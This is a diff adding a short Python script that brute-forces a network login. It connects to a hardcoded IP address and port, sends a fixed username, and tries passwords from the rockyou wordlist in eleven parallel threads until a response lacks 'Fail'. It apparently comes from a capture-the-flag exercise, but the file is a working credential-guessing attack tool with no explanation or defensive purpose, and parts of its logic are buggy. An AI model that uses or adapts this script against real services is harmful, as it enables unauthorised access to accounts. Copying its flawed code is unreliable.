@@ -1,0 +1,89 @@
+import socket
+import threading
+
+host = "142.93.136.81" # IP address here
+port = 1337 # Port here
+wordlist = "/usr/share/wordlists/rockyou.txt" # Point to wordlist file
+found_word = ""
+username = "v0idcache"
+def brute_force(word):
+    if word is None:
+        return "none"
+         # Establish socket connection
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((host, port))
+
+    data = s.recv(1024)     # Receives 1024 bytes from IP/Port
+    print(word)             # Prints data
+
+
+    s.send(username + "\n")
+    data = s.recv(1024)
+   
+    s.send(word + "\n") # Send a newline \n at the end of your command
+    data = s.recv(1024)
+    value = data
+                                                                    
+    print(data)
+
+   
+    if "Fail" not in data:
+        global found_word
+        found_word = word
+        
+        
+if __name__ == '__main__':
+    with open(wordlist) as fp:
+        
+        x = fp.readlines()
+        c = 0
+       # global found_word
+
+        while len(found_word) == 0:
+            print("pass_" + found_word + "_word")
+            one = x[c]
+            two = x[c+1]
+            three = x[c+2]
+            four = x[c+3]
+            five = x[c+4]
+            six = x[c+5]
+            sev = x[c+6]
+            eig = x[c+7]                                 
+            nine = x[c+8]
+            ten = x[c+9]
+            eleven= x[c+10]
+            c = c+1
+            
+            t1 = threading.Thread(target=brute_force, args=(one,))
+            t2 = threading.Thread(target=brute_force, args=(two,))
+            t3 = threading.Thread(target=brute_force, args=(three,))
+            t4 = threading.Thread(target=brute_force, args=(four,))
+            t5 = threading.Thread(target=brute_force, args=(five,))
+            t6 = threading.Thread(target=brute_force, args=(six,))
+            t7 = threading.Thread(target=brute_force, args=(sev,))
+            t8 = threading.Thread(target=brute_force, args=(eig,))
+            t9 = threading.Thread(target=brute_force, args=(nine,))
+            t10 = threading.Thread(target=brute_force, args=(ten,))
+            t11 = threading.Thread(target=brute_force, args=(eleven,))
+            t1.start()
+            t2.start()
+            t3.start()
+            t4.start()
+            t5.start()
+            t6.start()
+            t7.start()
+            t8.start()
+            t9.start()
+            t10.start()
+            t11.start()
+            t1.join()
+            t2.join()
+            t3.join()
+            t4.join()
+            t5.join()
+            t6.join()
+            t7.join()
+            t8.join()
+            t9.join()
+            t10.join()
+            t11.join()
